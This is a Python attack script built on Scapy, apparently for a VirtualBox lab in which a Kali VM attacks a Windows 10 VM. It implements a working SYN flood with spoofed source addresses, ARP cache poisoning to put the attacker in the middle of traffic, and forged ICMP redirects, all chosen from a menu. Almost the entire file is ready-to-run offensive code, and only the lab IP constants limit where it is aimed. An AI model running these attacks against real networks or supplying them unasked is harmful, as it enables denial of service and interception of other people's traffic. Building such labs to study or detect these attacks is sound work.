"""
attacker.py — Run on the Kali Linux VM (as root)
=================================================
Launches network attacks against the Windows victim VM.
No agent needed on Kali — this just attacks.

Usage:
    pip install scapy
    sudo python attacker.py

Targets:
    VICTIM_IP  = 192.168.56.20  (Windows 10 VM)
    GATEWAY_IP = 192.168.56.1   (Host machine / vboxnet0)
"""

import time
import sys
import threading

try:
    from scapy.all import (
        IP, TCP, ARP, Ether, ICMP,
        send, sendp, srp, get_if_hwaddr,
        RandIP, RandShort, getmacbyip, conf
    )
except ImportError:
    print("[!] Scapy not installed. Run: pip install scapy")
    sys.exit(1)

# ── Configuration ─────────────────────────────────────────────────────────────
VICTIM_IP    = "192.168.56.20"    # Windows 10 VM
GATEWAY_IP   = "192.168.56.1"    # Host machine (vboxnet0)
VICTIM_PORT  = 80                 # Port to SYN flood
INTERFACE    = "eth0"             # Kali network interface (change if needed)

# ─────────────────────────────────────────────────────────────────────────────
# Attack 1 — SYN Flood
# ─────────────────────────────────────────────────────────────────────────────
def syn_flood(stop_event):
    """
    Sends bursts of TCP SYN packets to VICTIM_IP:VICTIM_PORT
    with randomised spoofed source IPs.
    The victim's SYN_RECV backlog fills up, making the port unresponsive.
    """
    print(f"[*] SYN Flood started → {VICTIM_IP}:{VICTIM_PORT}")
    burst_size  = 150
    total_sent  = 0

    while not stop_event.is_set():
        pkts = [
            IP(src=RandIP(), dst=VICTIM_IP) /
            TCP(sport=RandShort(), dport=VICTIM_PORT, flags="S", seq=1000)
            for _ in range(burst_size)
        ]
        send(pkts, verbose=False, iface=INTERFACE)
        total_sent += burst_size
        print(f"  [SYN] Sent {total_sent:,} packets", end="\r")

    print(f"\n[*] SYN Flood stopped — total packets sent: {total_sent:,}")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 2 — ARP Spoofing
# ─────────────────────────────────────────────────────────────────────────────
def arp_spoof(stop_event):
    """
    Poisons the ARP cache of both victim and gateway:
      - Tells victim: "Gateway IP is at MY MAC"
      - Tells gateway: "Victim IP is at MY MAC"
    All traffic between them now passes through Kali (MITM).
    """
    print(f"[*] Resolving MACs...")
    victim_mac  = getmacbyip(VICTIM_IP)
    gateway_mac = getmacbyip(GATEWAY_IP)

    if not victim_mac:
        print(f"[!] Cannot resolve MAC for {VICTIM_IP} — is the VM reachable?")
        return
    if not gateway_mac:
        print(f"[!] Cannot resolve MAC for {GATEWAY_IP}")
        return

    my_mac = get_if_hwaddr(INTERFACE)
    print(f"[*] ARP Spoof started")
    print(f"    Victim  : {VICTIM_IP} ({victim_mac})")
    print(f"    Gateway : {GATEWAY_IP} ({gateway_mac})")
    print(f"    My MAC  : {my_mac}")
    count = 0

    while not stop_event.is_set():
        # Tell victim: "I am the gateway"
        send(ARP(op=2,
                 pdst=VICTIM_IP,  hwdst=victim_mac,
                 psrc=GATEWAY_IP, hwsrc=my_mac),
             verbose=False, iface=INTERFACE)

        # Tell gateway: "I am the victim"
        send(ARP(op=2,
                 pdst=GATEWAY_IP, hwdst=gateway_mac,
                 psrc=VICTIM_IP,  hwsrc=my_mac),
             verbose=False, iface=INTERFACE)

        count += 2
        print(f"  [ARP] Sent {count} poison packets", end="\r")
        time.sleep(1)

    # Restore ARP tables on stop
    print(f"\n[*] Restoring ARP tables...")
    for _ in range(5):
        send(ARP(op=2, pdst=VICTIM_IP,  hwdst=victim_mac,
                 psrc=GATEWAY_IP, hwsrc=gateway_mac), verbose=False)
        send(ARP(op=2, pdst=GATEWAY_IP, hwdst=gateway_mac,
                 psrc=VICTIM_IP,  hwsrc=victim_mac),  verbose=False)
    print("[*] ARP Spoof stopped — tables restored")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 3 — ICMP Redirect
# ─────────────────────────────────────────────────────────────────────────────
def icmp_redirect(stop_event):
    """
    Sends forged ICMP Redirect (type=5, code=1) messages appearing
    to come from the gateway, instructing the victim to route traffic
    for 8.8.8.8 through Kali instead of the real gateway.
    """
    my_ip = conf.iface.ip if hasattr(conf.iface, 'ip') else "192.168.56.10"
    print(f"[*] ICMP Redirect started → telling {VICTIM_IP} to route via {my_ip}")
    count = 0

    while not stop_event.is_set():
        pkt = (
            IP(src=GATEWAY_IP, dst=VICTIM_IP) /
            ICMP(type=5, code=1, gw=my_ip) /
            IP(src=VICTIM_IP, dst="8.8.8.8") /
            TCP(sport=1234, dport=80)
        )
        send(pkt, verbose=False, iface=INTERFACE)
        count += 1
        print(f"  [ICMP] Sent {count} redirect packets", end="\r")
        time.sleep(0.5)

    print(f"\n[*] ICMP Redirect stopped — total: {count} packets")


# ─────────────────────────────────────────────────────────────────────────────
# Menu
# ─────────────────────────────────────────────────────────────────────────────
ATTACKS = {
    "1": ("SYN Flood",     syn_flood),
    "2": ("ARP Spoofing",  arp_spoof),
    "3": ("ICMP Redirect", icmp_redirect),
}

def main():
    print("=" * 60)
    print("  Attacker — Kali VM")
    print("=" * 60)
    print(f"  Victim  : {VICTIM_IP}")
    print(f"  Gateway : {GATEWAY_IP}")
    print(f"  Interface: {INTERFACE}")
    print("=" * 60)
    print()
    for key, (name, _) in ATTACKS.items():
        print(f"  {key}. {name}")
    print()

    choice = input("Select attack: ").strip()
    if choice not in ATTACKS:
        print("[!] Invalid choice")
        sys.exit(1)

    name, fn = ATTACKS[choice]
    stop = threading.Event()
    thread = threading.Thread(target=fn, args=(stop,), daemon=True)
    thread.start()

    print(f"\n[*] {name} running. Press Enter to stop...")
    try:
        input()
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        thread.join(timeout=5)
        print(f"[*] Done.")


if __name__ == "__main__":
    if sys.platform != "win32":
        import os
        if os.geteuid() != 0:
            print("[!] Must run as root: sudo python attacker.py")
            sys.exit(1)
    main()
